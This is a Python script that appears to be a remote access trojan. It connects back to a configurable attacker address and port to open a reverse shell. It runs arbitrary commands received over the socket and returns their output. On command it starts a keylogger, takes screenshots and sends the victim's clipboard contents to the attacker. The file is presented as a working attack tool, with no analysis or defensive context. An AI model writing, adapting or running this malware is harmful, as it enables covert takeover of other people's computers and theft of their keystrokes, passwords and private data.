import socket
import subprocess
import os
import threading
import mss  # Screenshot capture
import pyperclip  # Clipboard hijacking
from pynput import keyboard

attacker_ip = "127.0.0.1"  # Change this to your IP
attacker_port = 4444  # Must match attacker's port

# Keylogger Setup
log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            file.write(f" [{key}] ")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Clipboard Hijacking
def hijack_clipboard(client):
    clipboard_data = pyperclip.paste()
    client.send(f"[+] Clipboard Data: {clipboard_data}".encode())

# Screenshot Capture using mss
def capture_screenshot(client):
    with mss.mss() as sct:
        screenshot = sct.shot(output="screenshot.png")
    client.send(b"[+] Screenshot Taken!")

# Reverse Shell Function
def connect_to_attacker():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((attacker_ip, attacker_port))

    while True:
        cmd = client.recv(1024).decode()
        if cmd.lower() == "exit":
            break
        elif cmd.lower() == "screenshot":
            capture_screenshot(client)
        elif cmd.lower() == "keylog":
            client.send(b"[+] Keylogger Started!")
            start_keylogger()
        elif cmd.lower() == "clipboard":
            hijack_clipboard(client)
        else:
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            client.send(output.stdout.encode() + output.stderr.encode())

    client.close()

# Multi-threading to run everything together
t1 = threading.Thread(target=connect_to_attacker)
t1.start()
